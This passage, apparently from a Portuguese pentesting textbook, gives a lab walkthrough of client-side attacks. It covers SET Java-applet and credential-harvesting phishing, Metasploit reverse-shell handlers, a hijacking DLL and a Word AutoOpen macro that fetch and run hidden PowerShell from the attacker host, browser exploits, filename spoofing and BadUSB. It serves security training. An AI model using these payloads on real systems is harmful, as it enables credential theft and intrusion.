ttack\tVectors\n3)\tInfectious\tMedia\tGenerator\n4)\tCreate\ta\tPayload\tand\tListener\n5)\tMass\tMailer\tAttack\n6)\tArduino-Based\tAttack\tVector\n7)\tWireless\tAccess\tPoint\tAttack\tVector\n8)\tQRCode\tGenerator\tAttack\tVector\n9)\tPowershell\tAttack\tVectors\n10)\tThird\tParty\tModules\n99)\tReturn\tback\tto\tthe\tmain\tmenu.\nset\n>\t2\nA\tpróxima\ttela\tmostra\tos\tprincipais\tataques\tvoltados\tà\tweb,\tcomo\ta\tconstrução\nde\taplicativos\tJava\tmaliciosos\t(opção\t\n1)\tJava\tApplet\tAttack\tMethod\n),\tataques\nvoltados\tà\texploração\tde\tfalhas\tem\tnavegadores\t(opção\t\n2)\tMetasploit\tBrowser\nExploit\tMethod\n),\tataque\tde\tcaptura\tde\tlogin\t(opção\t\n3)\tCredential\tHarvester\nAttack\tMethod\n)\te\toutros.\nVamos\tcomeçar\tcriando\tum\taplicativo\tJava\tque,\tse\texecutado\tpela\tvítima,\tdará\nacesso\tmeterpreter\tà\tmáquina\talvo.\tPara\tesse\tlaboratório,\tinstale\to\tJava\tna\nmáquina\tWindows.\tO\tJava\tpode\tser\tobtido\tem\nhttps://www.java.com/pt_BR/download.\nEscolha\ta\topção\t\n1)\tJava\tApplet\tAttack\tMethod\n.\n1)\tJava\tApplet\tAttack\tMethod\n2)\tMetasploit\tBrowser\tExploit\tMethod\n3)\tCredential\tHarvester\tAttack\tMethod\n4)\tTabnabbing\tAttack\tMethod\n5)\tWeb\tJacking\tAttack\tMethod\n6)\tMulti-Attack\tWeb\tMethod\n7)\tFull\tScreen\tAttack\tMethod\n8)\tHTA\tAttack\tMethod\n99)\tReturn\tto\tMain\tMenu\nset\n:\nwebattack\n>\t1\nO\tSET\tfornece\ta\topção\tde\tusar\tum\ttemplate\tpronto,\tclonar\tum\tsite\tou\timportar\num\ttemplate.\nCom\ta\topção\t\n1)Web\tTemplate\n,\to\tSET\tvai\tcriar\tuma\tpágina\tpronta\tcom\tumlayout\tjá\tpredefinido.\nCom\ta\topção\t\n2)Site\tCloner\n,\to\tSET\tvai\tclonar\tuma\tpágina\tda\tweb.\tNo\tmomento\nem\tque\ta\tvítima\tacessar\to\tsite\t\nhttp://192.168.1.100\n,\tserá\texibida\ta\tpágina\nclonada\te\tum\taplicativo\tJava\tmalicioso.\nCom\ta\topção\t\n3)\tCustom\tImport\n\tserá\timportado\tum\ttemplate\tcriado\tpelo\tleitor.\nUtilize\ta\topção\t\n1)Web\tTemplate.\n1)\tWeb\tTemplates\n2)\tSite\tCloner\n3)\tCustom\tImport\n99)\tReturn\tto\tWebattack\tMenu\nset\n:\nwebattack\n>\t1\nO\tSET\ttambém\tpergunta\tao\tleitor\tse\testá\tutilizando\tredirecionamento\tde\tportas.\nO\tredirecionamento\tde\tportas\té\tutilizado,\tpor\texemplo,\tquando\tse\trealiza\tum\nataque\te\ta\tvítima\tencontra-se\tna\tinternet\te\tnão\tna\trede\tlocal\t(LAN).\nComo\to\tambiente\testá\tsendo\tapenas\ta\trede\tlocal,\tdeixe\tcomo\tsendo\t“no”.\n[-]\tNAT/Port\tForwarding\tcan\tbe\tused\tin\tthe\tcases\twhere\tyour\tSET\tmachine\tis\n[-]\tnot\texternally\texposed\tand\tmay\tbe\ta\tdifferent\tIP\taddress\tthan\tyour\treverse\tlistener.\nset\n>\tAre\tyou\tusing\tNAT/Port\tForwarding\t[yes|no]:\tno\nNa\tpróxima\tpergunta,\tdigite\to\tIP\tdo\tKali\tLinux\tpara\tque\teste\tescute\tpor\nconexões\treversas.\n[-]\tEnter\tthe\tIP\taddress\tof\tyour\tinterface\tIP\tor\tif\tyour\tusing\tan\texternal\tIP,\twhat\n[-]\twill\tbe\tused\tfor\tthe\tconnection\tback\tand\tto\thouse\tthe\tweb\tserver\t(your\tinterface\taddress)\nset\n:\nwebattack\n>\tIP\taddress\tor\thostname\tfor\tthe\treverse\tconnection:\t192.168.1.100\nA\tcriação\tde\tum\tapplet\tJava\trequer\tcertificados\tdigitais.\tO\tSET\tpossibilita\tque\to\nusuário\tcrie\tum\tcertificado\tdigital\tpelo\tSET\t(opção\t\n1.\tMake\tmy\town\tself-signed\ncertificate\tapplet.\n).\tUtilize\tum\tcertificado\tque\to\tpróprio\tSET\tvai\tconstruir\t(opção\n2.\tUse\tthe\tapplet\tbuilt\tinto\tSET.\n)\tou,\tse\to\tusuário\tpossuir\to\tseu\tpróprio\ncertificado\tdigital,\timporte-o\tpara\to\tSET\t(opção\t\n3.\tI\thave\tmy\town\tcode\tsigning\ncertificate\tor\tapplet.\n).\tSelecione\ta\topção\t\n2.\tUse\tthe\tapplet\tbuilt\tinto\tSET\t\npara\nque\to\tSET\tcrie\tum\tcertificado.\n[-------------------------------------------]\nJava\tApplet\tConfiguration\tOptions\tBelow\n[-------------------------------------------]\nNext\twe\tneed\tto\tspecify\twhether\tyou\twill\tuse\tyour\town\tself\tgenerated\tjava\tapplet,\tbuilt\tin\tapplet,\tor\tyour\nown\tcode\tsigned\tjava\tapplet.\tIn\tthis\tsection,\tyou\thave\tall\tthree\toptions\tavailable.\tThe\tfirst\twill\tcreate\taown\tcode\tsigned\tjava\tapplet.\tIn\tthis\tsection,\tyou\thave\tall\tthree\toptions\tavailable.\tThe\tfirst\twill\tcreate\ta\nself-signed\tcertificate\tif\tyou\thave\tthe\tjava\tjdk\tinstalled.\tThe\tsecond\toption\twill\tuse\tthe\tone\tbuilt\tinto\nSET,\tand\tthe\tthird\twill\tallow\tyou\tto\timport\tyour\town\tjava\tapplet\tOR\tcode\tsign\tthe\tone\tbuilt\tinto\tSET\tif\nyou\thave\ta\tcertificate.\nSelect\twhich\toption\tyou\twant:\n1.\tMake\tmy\town\tself-signed\tcertificate\tapplet.\n2.\tUse\tthe\tapplet\tbuilt\tinto\tSET.\n3.\tI\thave\tmy\town\tcode\tsigning\tcertificate\tor\tapplet.\nEnter\tthe\tnumber\tyou\twant\tto\tuse\t[1-3]:\t2\nCriado\to\tcertificado,\tselecione\tqual\to\ttemplate\tdesejado.\tPodemos\tutilizar\to\ntemplate\t\n1.\tJava\tRequired\n,\t\n2.\tGoogle\n,\t\n3.\tFacebook\n\tetc.\tO\ttemplate\tpronto\té\tuma\npágina\tjá\tcriada\tpelo\tSET\tque\testá\tarmazenada\tem\tsua\tbase\tde\tdados.\tAssim,\to\nSET\tpossui\tuma\tbase\tde\tdados\tcom\tum\tclone\tdo\tsite\tdo\tGoogle,\tdo\tFacebook\netc.\tComo\tesses\tsites\tsão\tatualizados\tfrequentemente\te\tmudam\tde\taparência\tbem\nrápido,\tvamos\tcolocar\tuma\taparência\tmais\tgenérica,\tque\tnos\tdê\ta\timpressão\tde\nque,\tpara\tacessar\taquele\tsite,\té\tnecessário\tinstalar\to\tJava,\tselecionando\ta\topção\n1.\tJava\tRequired.\n[*]\tOkay!\tUsing\tthe\tone\tbuilt\tinto\tSET\t-\tbe\tcareful,\tself\tsigned\tisn't\taccepted\tin\tnewer\tversions\tof\tJava\t:(\n1.\tJava\tRequired\n2.\tGoogle\n3.\tFacebook\n4.\tTwitter\n5.\tYahoo\nset\n:\nwebattack\n>\tSelect\ta\ttemplate:\t1\nO\tSET\ttambém\trequer\to\tpayload\tque\tserá\tutilizado\tpara\testabelecer\ta\tconexão\nreversa\tquando\to\tusuário\taceitar\to\tnosso\taplicativo\tJava.\tHá\tdiversos\tpayloads,\ncomo\tum\tshell\treverso\tconvencional,\tconexões\tVNC,\tshell\ttunelado\tsobre\to\nprotocolo\tHTTP\tou,\taté\tmesmo,\to\tnosso\tpróprio\texecutável\t(opção\t\n17)\tImport\nyout\town\texecutable\n)\n.\nWhat\tpayload\tdo\tyou\twant\tto\tgenerate:\nName:\tDescription:\n1)\tMeterpreter\tMemory\tInjection\t(DEFAULT)\tThis\twill\tdrop\ta\tmeterpreter\tpayload\tthrough\tPyInjector\n2)\tMeterpreter\tMulti-Memory\tInjection\tThis\twill\tdrop\tmultiple\tMetasploit\tpayloads\tvia\tmemory\n3)\tSE\tToolkit\tInteractive\tShell\tCustom\tinteractive\treverse\ttoolkit\tdesigned\tfor\tSET\n4)\tSE\tToolkit\tHTTP\tReverse\tShell\tPurely\tnative\tHTTP\tshell\twith\tAES\tencryption\tsupport\n5)\tRATTE\tHTTP\tTunneling\tPayload\tSecurity\tbypass\tpayload\tthat\twill\ttunnel\tall\tcomms\tover\tHTTP\n6)\tShellCodeExec\tAlphanum\tShellcode\tThis\twill\tdrop\ta\tmeterpreter\tpayload\tthrough\tshellcodeexec7)\tImport\tyour\town\texecutable\tSpecify\ta\tpath\tfor\tyour\town\texecutable\nset:payloads>\t7\nComo\testamos\timportando\to\tnosso\texecutável,\tprimeiro\tcrie\tuma\tbackdoor\tde\nconexão\treversa\te\tdepois\tconfigure\to\tMetasploit\t\npara\tesperar\tpor\tconexões\n(maiores\tdetalhes\tconsulte\ta\tseção\t12.1\tBackdoors).\nset:payloads>\tEnter\tthe\tpath\tto\tyour\texecutable:/var/www/reverse.exe\nNa\tmáquina\tWindows,\tacesse\to\tIP\tdo\tKali\tLinux,\t\nhttp://192.168.1.100\n.\nDevido\tàs\tnovas\tconfigurações\tde\tsegurança,\tapplets\tJava\tsão\tbloqueados,\nconforme\tmostra\ta\tfigura\t10.1.\nFigura\t10.1\t–\tApplets\tJava\tsão\tbloqueados\tem\tversões\tmais\tnovas\tdo\tJava.\nPara\tpermitir\tapplets\tJava,\tvá\tem\t\nPainel\tde\tcontrole\n,\t\nJava\n,\t\nSegurança\n,\t\nEditar\nLista\tde\tsites\n\te\tinsira\to\tIP\tdo\tKali\tLinux,\tconforme\tmostra\ta\tfigura\t10.2.\nFigura\t10.2\t–\tPermita\tapplets\tvindo\tdo\tIP\thttp://192.168.1.100.Acesse\tnovamente\to\tsite\t\nhttp://192.168.1.100\n.\tDessa\tvez,\tserá\texibido\toutro\nalerta\tperguntando\tse\to\tusuário\tdeseja\tabrir\to\tapplet\tJava.\tConfirme\tclicando\nsobre\to\tcheckbox\t\nEu\taceito\to\trisco\te\tdesejo\texecutar\tessa\taplicação\n,\tconforme\nmostra\ta\tfigura\t10.3.\nFigura\t10.3\t–\tPermita\ta\texecução\tde\taplicativos\tJava.\nA\tsessão\tMeterpreter\tserá\taberta\tno\tsistema.\nPara\tnão\trepetir\tos\tpassos\tanteriores\te\tpara\tuma\tmelhor\tvisualização\tdo\tlivro,\npara\tos\tpróximos\tlaboratórios\tserá\tadotada\ta\tnumeração\t\nX.Y.Z\n.\tEntão,\tpor\nexemplo,\tsempre\tinicie\tcada\tlaboratório\tcom\ta\ttela\tinicial\tdo\tSET\t(digitando\nsetoolkit\n\tno\tterminal).\tEntenda\t\n1.2.3\n\tcomo\tsendo\ta\tescolha\tdas\tseguintes\topções\n1)\tSocial-Engineering\tAttacks\n,\t\n2)Website\tAttack\tVectors\n,\t\n3)Credential\nHarvester\tAttack\tMethod\n.\n•\tOpção\t1.2.3\t–\tCredential\tHarvester\tAttack\tMethod\nEsse\tataque\tpermite\ta\tclonagem\tde\tqualquer\tpágina,\tcriando\tum\tphishing\n.\t\nPara\ncapturar\tas\tcredenciais\tdo\talvo,\to\tusuário\tterá\tque\tacessar\to\tendereço\tdo\nphishing.\nPara\tcriar\tuma\tpágina\tbem\tverossímil,\tescolha\ta\topção\t“\n2)\tSite\tCloner”\n\te\nrealize\ta\tclonagem\tde\tuma\tpágina.\nDigite\to\tIP\tdo\tKali\tLinux\tno\tcampo\t\nset:webattack>\tIP\taddress\tfor\tthe\tPOST\nback\tin\tHarvester/Tabnabbing:\nDigite\ta\tURL\tque\tdeseja\tclonar\tno\tcampo\t\nset:webattack>\tEnter\tthe\turl\tto\nclone:\nOs\tarquivos\tpara\to\tphishing\tforam\tcopiados\tpara\ta\tpasta\t\n/var/www\n.\nO\tusuário\tdeverá\tacessar\to\tendereço\tURL\tque\tcontém\to\t\nphishing\n(\nhttp://192.168.1.100\n)\te\tdigitar\to\tseu\tnome\tde\tusuário\te\tsenha.\nAcesse\ta\tpasta\t\n/var/www\n\te\tlá\thaverá\tum\tarquivo\tde\ttexto\tcontendo\taquilo\tquefoi\tdigitado\tpelo\tusuário\t(editado\tpor\tmotivos\tvisuais).\nroot@kali#\n\tcat\t/var/www/harvester*.txt\nArray\n(\n[GALX]\t=>\tFP17UhnEtR8\n[continue]\t=>\t\nhttps://accounts.google.com/ManageAccount\n[followup]\t=>\thttps://accounts.google.com/ManageAccount\n[pstMsg]\t=>\t1\n[\nEmail\n]\t=>\t\nemail@gmail.com\n[\nPasswd\n]\t=>\t\nsenha_gmail\n[signIn]\t=>\tSign\tin\n[PersistentCookie]\t=>\tyes\n[rmShown]\t=>\t1\n•\tOpção\t1.9\t–\tPowerShell\tAttack\tVectors\nO\tPowershell\té\tum\tprompt\tde\tcomandos\tdo\tWindows,\tque\tfoi\timplementado\ta\npartir\tdo\tWindows\tVista\te\tque\tpossibilita\tutilizar\tscripts\tpara\tautomatização\nde\ttarefas.\tO\tPowerShell\tpossui\talguns\tcomandos\tque\tsão\tnativos\tao\tLinux,\ncomo\to\t\nls\n.\tAtaques\tcontra\to\tPowerShell\t(versões\tsuperiores\tao\tWindows\nVista\tcontêm\tnativamente\to\tPowerShell)\tpossibilitam\ta\tobtenção\tdo\tshell\nreverso.\tA\tgrande\tvantagem\tem\tse\tutilizar\to\tPowerShell\tcomo\tvetor\tde\nataque\té\tque,\tdiferentemente\tde\tataques\tconvencionais\t(como\tarquivos\nexecutáveis),\to\tPowerShell\texecuta\ta\tinstrução\t(no\tnosso\tcaso\to\tpayload)\ndiretamente\tna\tmemória,\tnão\tsendo\texecutada\tno\tdisco\trígido\t(ataques\nconvencionais),\te\tisso\tdificulta,\te\tmuito,\ta\tdetecção\tdo\tnosso\tpayload\tcomo\numa\tinstrução\tmaliciosa\tpor\tsistemas\tde\tantivírus.\nConfigure\to\tSET\tpara\tque\to\tPowerShell\trealize\ta\tinjeção\tdo\tshellcode\tvia\ncaracteres\talfanuméricos,\tselecionando\ta\topção\t\n1)\tPowershell\tAlphanumeric\nShellcode\tInjector.\nDigite\to\tIP\tdo\tKali\tLinux\tno\tcampo\t\nset>\tIP\taddress\tfor\tthe\tpayload\tlistener\n(LHOST):\nDigite\ta\tporta\tpara\ta\tconexão\treversa\tno\tcampo\n\tset:powershell>\tEnter\tthe\tport\nfor\tthe\treverse\t[443]:\nParticularmente,\tprefiro\tiniciar\to\tMetasploit\tem\tuma\tjanela\tseparada,\tmas,\ncaso\to\tleitor\tdeseje,\tpoderá\tiniciar\to\tMetasploit\tpelo\tsetoolkit\tdigitando\t\nyes\nno\tcampo\t\nset>\tDo\tyou\twant\tto\tstart\tthe\tlistener\tnow\t[yes/no]:No\tfinal\tserá\tgerado\tum\tarquivo\t\ntxt\n,\tmova-o\tpara\ta\tpasta\t\n/var/www.\nroot@kali#\n\tmv\t/root/.set/reports/powershell/x86_powershell_injection.txt\t/var/www/shell.bat\nSe\to\tleitor\tnão\tinicializou\to\tMetasploit\tpelo\tsetoolkit,\tdeverá\tinicializá-lo\nmanualmente:\nroot@kali#\n\tmsfconsole\nmsf\n\t>\tuse\texploit/multi/handler\nmsf\n\texploit(handler)>\tset\tPAYLOAD\twindows/meterpreter/reverse_tcp\nmsf\n\texploit(handler)>\tset\tLPORT\t12345\nmsf\n\texploit(handler)>\tset\tLHOST\t192.168.1.100\nmsf\n\texploit(handler)>\texploit\nPelo\tWindows,\tacesse\t\nhttp://192.168.1.100/shell.bat\t\ne\texecute\to\tarquivo\t\n.bat\n.\n10.4\tOffice\t2010\tpptimpconv\tDLL\thijacking\nO\tPowerPoint\t2010\tapresenta\tuma\tvulnerabilidade\tde\tDLL\thijacking.\tEssa\nvulnerabilidade\tcaracteriza-se\tpor\tuma\tDLL\tque,\tse\testiver\tno\tmesmo\tdiretório\ndo\tarquivo\t\n.pptx\n,\to\tPowerPoint\tlevará\tcomo\tprioridade\tessa\tDLL\t(criada\tpor\tnós\ne\tmaliciosa),\te\tnão\ta\tDLL\toriginal\tdo\tprograma.\nDeve\tser\tcriado\tum\tarquivo\t\n.pptx\n\te\tna\tmesma\tpasta\tuma\tDLL\tcom\to\tnome\tde\npptimpconv.dll\n.\nUtilize\to\tDevC++\tpara\ta\tcriação\tda\tDLL\t\nhttp://sourceforge.net/projects/dev-\ncpp/files/Binaries/Dev-C%2B%2B%204.9.9.2/.\nCrie\tum\tnovo\tprojeto\tem\t\nArquivo\t>\tNovo\t>\tProjeto.\nSelecione\to\tprojeto\tdo\ttipo\t\nDLL\te\tescolha\tum\tprojeto\tda\tlinguaguem\tC\t(por\npadrão\testará\tmarcado\tcomo\tC++).\nSalve\to\tprojeto\t(\nProjeto1.dev\n)\tem\tuma\tpasta\tde\tsua\tpreferência.\nSão\tcriados\tdois\tarquivos\tdentro\tdo\tprojeto\t(\ndll.h\n\te\t\ndllmain.cpp\n).\tO\tarquivo\t\ndll.h\npode\tser\texcluído\tdo\tprojeto.\tClique\tcom\to\tbotão\tdireito\tdo\tmouse\tno\tarquivo\ndll.h\n\t(coluna\tà\tesquerda)\te\tselecione\ta\topção\t\nRemover\tArquivo\n\t(não\té\nnecessário\tsalvar\tmudanças).\nSerão\tpoucas\tas\talterações\tno\tconteúdo\tdo\tarquivo\t\ndllmain.cpp\n,\tque\tdeve\tficar\nda\tseguinte\tforma:\n#include\t<windows.h>\n#include\t<stdio.h>\n#include\t<stdlib.h>BOOL\tAPIENTRY\tDllMain\n(HINSTANCE\thInst\t/*\tLibrary\tinstance\thandle.\t*/\t,\nDWORD\treason\t/*\tReason\tthis\tfunction\tis\tbeing\tcalled.\t*/\t,\nLPVOID\treserved\t/*\tNot\tused.\t*/\t)\n{\n\t\t\t\tswitch\t(reason)\n\t\t\t\t{\n\t\t\t\t\t\tcase\tDLL_PROCESS_ATTACH:\n\t\t\t\t\t\tcase\tDLL_PROCESS_DETACH:\n\t\t\t\t\t\tcase\tDLL_THREAD_ATTACH:\n\t\t\t\t\t\tcase\tDLL_THREAD_DETACH:\n\t\t\t\t\t\t\t\tWinExec(“calc”,1);\n\t\t\t\t\t\t\t\texit(0);\n\t\t\t\t}\n}\nOu\tseja,\tapenas\tapagamos\tos\tconteúdos\tdas\tvariáveis\tDLL\te\tincluímos\ta\nexecução\tlocal\tda\tcalculadora\tem\tmodo\tvisível\t(1).\nCompile\to\tarquivo\tna\taba\t\nExecutar\t>\tCompilar.\nRenomeie\to\tarquivo\t\nProjeto1.dll\n\tpara\t\npptimpconv.dll\n.\nCrie\tum\tnovo\tarquivo\t\n.pptx\t\ndo\tPowerPoint\t2010\tno\tmesmo\tdiretório\tem\tque\tse\nencontra\t\npptimpconv.dll\n.\nAo\texecutar\to\tarquivo\tdo\tPowerPoint\t2010\té\taberta\ta\tcalculadora.\nAgora,\tque\ttal\talgo\tmais\tperigoso?\nGere\tum\tpayload\tdo\tPowerShell\tutilizando\to\tsetoolkit\te\ttroque\ta\tlinha\nWinExec(\"calc\",1);\n\tpelo\tpayload\tdo\tPowerShell\te\ta\tvisibilidade\tde\t1\tpara\t0\n(invisível).\tO\tcódigo\ta\tseguir\t(editado\tpor\tmotivos\tvisuais)\tficará\tparecido\tcom:\ncase\tDLL_THREAD_DETACH:\n\t\tWinExec(\"powershell\t-nop\t-windowstyle\thidden\t-noni\t-enc\tJAAxABhOI\",0);\n\t\texit(0);\nNesse\tmomento\té\texecutada\tuma\tconexão\treversa\tcom\ta\tmáquina\tdo\tatacante.\n10.5\tMacros\tmaliciosas\nUm\tdocumento\tcriado\tpelo\tOffice\tpode\tpossuir\tmacros,\tque\tsão\tfunções\nagregadas\tpara\texecução\tde\tdeterminadas\tações.\tPor\texemplo,\tse\tfor\tdo\tdesejo\ndo\tusuário,\tele\tpoderá\tcriar\tum\tdocumento\te\tincluir\tuma\tmacro\tpara\texecutarum\tarquivo\tlocal,\tcomo\tuma\tmúsica\tou\tum\tvídeo\t(supondo\tuma\tapresentação\tdo\nPowerPoint\tou\tde\tum\tdocumento\tdo\tWord).\tLogicamente,\tessa\tfuncionalidade\nde\texecução\tde\tarquivos\tlocais\tpoderá\tdar\tacesso\tshell\ta\tum\tatacante\tmal-\nintencionado\t(utilizando\to\tPowerShell).\tPara\tque\to\tleitor\tse\tfamiliarize\tcom\ta\ncriação\tde\tmacros,\tvamos,\tprimeiro,\tcriar\tuma\tmacro\tsimples\tem\tum\tdocumento\ndo\tWord\tpara\texecutar\ta\tcalculadora.\nVersões\tmais\tnovas\tdo\tWord\tcriam\te\tsalvam\tdocumentos\tno\tformato\t\n.docx\n.\nInfelizmente,\tesse\tformato\tnão\tsuporta\ta\tgravação\tde\tmacro.\tPorém\ta\tnotícia\npositiva\té\tque\tnós\tpodemos\ttrabalhar\tno\tformato\t\n.doc\n\tcriando,\tsalvando\te\tdepois\ntransferindo\ta\tmacro\tpara\ta\tnossa\tvítima.\nPrimeiro,\tcrie\tum\tarquivo\tno\tformato\t\n.doc\n.\nA\tcriação\tda\tmacro\tvai\tdepender\tda\tversão\tdo\tOffice.\tPara\tversões\tdo\tOffice\n2010,\ta\tmacro\té\tcriada\tno\tcampo\t\nExibição\t>\tMacros\t>\tExibir\tMacros\n\t(Figura\n10.4).\nFigura\t10.4\t–\tExibição/gravação\tde\tmacros.\nSelecione\tum\tnome\tpara\ta\tsua\tmacro\tno\tcampo\t\nNome\tda\tMacro\n\t(selecionei\to\nnome\tAutoOpen)\te\tcertifique-se\tno\tcampo\t\nMacros\tem\n\tque\ta\tsua\tmacro\tserá\ngravada\tdentro\tdo\tarquivo\tdo\tWord\t(Figura\t10.5).\nO\tconteúdo\tda\tmacro\tserá:\nSub\tAutoOpen()\n\t\t\t\tCall\tShell(\"calc\")\nEnd\tSub\nPronto.\tExecute\ta\tmacro\tcom\t\nF5\n\te\ta\tcalculadora\tserá\taberta\tna\ttela.\tAgora,\nVamos\ttrocar\ta\tcalculadora\tpelo\tPowerShell.Figura\t10.5\t–\tCrie\tuma\tmacro\tpara\to\tseu\tdocumento.\nO\tMetasploit\tpossui\to\tmódulo\t\nexploit/multi/script/web_delivery\n\tque\tcria\tum\npequeno\tservidor\tweb\te\tgera\tum\tpequeno\ttexto\t(Python,\tPHP\tou\tPowerShell).\nNo\tmomento\tem\tque\to\ttexto\té\texecutado\tna\tmáquina,\té\trealizada\ta\tconexão\tno\nservidor\tweb\te,\tposteriormente,\ta\tconexão\treversa.\tVamos\tconfigurar\to\tmódulo\nweb_delivery\n\tpara\tgerar\to\ttexto\tpara\tPowerShell.\nroot@kali#\n\tmsfconsole\nmsf\n\texploit\t>\tuse\texploit/multi/script/web_delivery\nmsf\n\texploit(web_delivery)\t>\tset\tTARGET\t2\nmsf\n\texploit(web_delivery)\t>\tset\tPAYLOAD\twindows/meterpreter/reverse_tcp\nmsf\n\texploit(web_delivery)\t>\tset\tLHOST\t192.168.1.100\nmsf\n\texploit(web_delivery)\t>\tset\tSRVHOST\t192.168.1.100\nmsf\n\texploit(web_delivery)\t>\tset\tURIPATH\t/\nmsf\n\texploit(web_delivery)\t>\texploit\n[*]\tUsing\tURL:\thttp://192.168.1.100:8080/\n[*]\tServer\tstarted.\n[*]\tRun\tthe\tfollowing\tcommand\ton\tthe\ttarget\tmachine:\npowershell.exe\t-nop\t-w\thidden\t-c\tIEX\t((new-object\nnet.webclient).downloadstring('http://192.168.1.100:8080/'))\nTroque\to\tcódigo\tda\tmacro\tda\tcalculadora\tpelo\tPowerShell:\nSub\tAutoOpen()\nCall\tShell(\"\npowershell.exe\t-nop\t-w\thidden\t-c\tIEX\t((new-\nobjectnet.webclient).downloadstring('http://192.168.1.100:8080/'))\n\")\nEnd\tSub\nAo\texecutar\ta\tmacro,\té\tgerada\tuma\tsessão\tMeterpreter.\nNo\tfim\tdo\tarquivo,\tlembre-se\tde\tsalvar\tas\talterações\tpara\tgravarmos\ta\tnossamacro.\n10.6\tInternet\tExplorer\tms10_046\nO\tInternet\tExplorer\tem\tversões\tinferiores\tà\tversão\t8\tsofre\tde\tuma\nvulnerabilidade\tem\tque,\tcaso\ta\tpágina\tmaliciosa\tseja\taberta,\tpoderá\tser\nexecutado\to\tcódigo\tremoto.\nroot@kali#\n\tmsfconsole\nmsf\n\t>\tuse\texploit/windows/browser/ms10_046_shortcut_icon_dlloader\nmsf\n\texploit(ms10_046_shortcut_icon_dlloader)\t>\tset\tSRVHOST\t192.168.1.100\nmsf\n\texploit(ms10_046_shortcut_icon_dlloader)\t>\texploit\nPelo\tWindows,\tacesse\to\tsite\t\nhttp://192.168.1.100.\n10.7\tInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\nRemote\tCode\tExecution\nVulnerabilidade\tque\tafeta\to\tInternet\tExplorer\tem\tversões\tinferiores\tà\tversão\t11.\nO\texploit\tpode\tser\tencontrado\tem\t\nhttp://www.exploit-db.com/exploits/35229\n.\nPelo\tWindows,\tacesse\to\tsite\t\nhttp://192.168.1.100\n\tque\tserá\texecutado\to\tNotepad.\nQue\ttal\tem\tvez\tda\tcalculadora\texecutarmos\tum\tshell\treverso?\nTroque\ta\tlinha\tdo\tNotepad\tpelo\tcódigo\tdo\tPowerShell\tgerado\tcom\to\tsetoolkit\n(editado\tpor\tmotivos\tvisuais).\nfunction\trunmumaa()\n\t\tOn\tError\tResume\tNext\n\t\tset\tshell=createobject(\"Shell.Application\")\n\t\tshell.ShellExecute\t\"\npowershell.exe”,\t“-nop\t-windowstyle\thidden\t-noni\t-enc\tJAAxABhOI\n\"\nend\tfunction\n10.8\tFirefox\tAdd-on\nO\tnavegador\tFirefox\tpossibilita\ta\tinstalação\tde\tplugins.\tPorém\tplugins\nmaliciosos\tpodem\tser\tfacilmente\tcriados.\nroot@kali#\n\tmsfconsole\nmsf\n\t>\tuse\texploit/multi/browser/firefox_xpi_bootstrapped_addon\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tURIPATH\t/\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tSRVHOST\t192.168.1.100msf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tSRVPORT\t8080\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tTARGET\t1\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tPAYLOAD\twindows/meterpreter/reverse_tcp\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\tset\tLHOST\t192.168.1.100\nmsf\n\texploit(firefox_xpi_bootstrapped_addon)\t>\texploit\nPelo\tWindows,\tacesse\to\tsite\t\nhttp://192.168.1.100:8080\n\te\texecute\to\tplugin.\n10.9\tUnitrix\tExploit\nO\tUnitrix\texploit\texplora\tuma\tvulnerabilidade\tno\tmapa\tde\tcaracteres\tem\tversões\nWindows\tsuperiores\tao\tVista.\tEsse\texploit\té\tmeramente\tvisual,\tdando\ta\nimpressão\tde\tque\tum\tarquivo\tcom\to\tmapa\tde\tcaracteres\tU202+E\ttem\tqualquer\nextensão,\tcomo\tDOC,\tPDF\tetc.\nEntre\tno\tmapa\tde\tcaracteres\tdo\tWindows,\tconforme\tmostra\ta\tfigura\t10.6.\nFigura\t10.6\t–\tMapa\tde\tcaracteres\tdo\tWindows.\nEscolha\ta\topção\t\nU202+E:\tForçar\ta\tescrita\tda\tdireita\tpara\ta\tesquerda\n.\nRenomeie\tum\tarquivo\tda\tseguinte\tforma:\ns\nCtrl+V\nCOD.exe\nO\tarquivo\t\n.exe\n\tserá\trenomeado\t(apenas\tvisualmente)\tpara\ta\textensão\t\n.doc\n.\n10.10\tBadUSB\nUma\tdas\tnotícias\tmais\talarmantes\tque\to\tmundo\tda\tsegurança\tda\tinformação\tjá\nnoticiou\tfoi\to\tBadUSB,\tdesenvolvido\tpelos\tpesquisadores\tda\tSR\tLabs\n(\nhttps://srlabs.de/badusb\n)\te\tapresentado\tna\tDefcon\t(um\tdos\tmaiores\teventos\tde\nhacking\n)\tde\t2014.O\tBadUSB\tconsiste\tna\tmodificação\tdo\tfirmware\toriginal\tdo\tUSB\tpara\tum\nfirmware\tcustomizado.\tÉ\tpossível,\tpor\texemplo,\ttrocar\to\tfirmware\tde\tum\npendrive\tconvencional\tpara\tum\tfirmware\tinfectado\tcom\tbackdoor,\te,\tno\nmomento\tem\tque\to\tUSB\tfor\tinserido\tna\tmáquina,\testa\tficará\tinfectada\te\ncomprometida.\tUm\tmínimo\tde\tengenharia\tsocial\té\tnecessário\tpara\tque\ta\tpessoa\ninsira\to\tUSB\tna\tmáquina\te\ttenha\ttoda\ta\tsua\trede\tcomprometida.\nEle\tnão\ttem\tseu\tcódigo-fonte\tdistribuído\tpela\tSR\tLabs,\tporém\tos\tpesquisadores\nAdam\tCaudill\te\tBrandon\tWilson\trealizaram\tdiversos\ttestes\te\tcriaram\tuma\nversão\tprópria\tdo\tBadUSB.\t(Obrigado,\tAdam!)\n10.10.1\tLaboratório\tBadUSB\nO\tcódigo\tdo\tAdam\té\tum\tcódigo\tpersonalizado\tpara\to\tfirmware\tps2251-03.\tCaso\no\tUSB\tapresente\tesse\tfirmware,\té\tpossível\talterá-lo\tpara\tum\tfirmware\ncustomizado.\tEntão,\tpara\tesse\tlaboratório,\té\tnecessário\tespecificamente\tum\tUSB\ncom\to\tfirmware\t\nps2251-03\n.\tUma\tlista\tde\tUSBs\tque\tpossuem\tnativamente\tesse\nfirmware\t pode\t ser\t encontrada\t 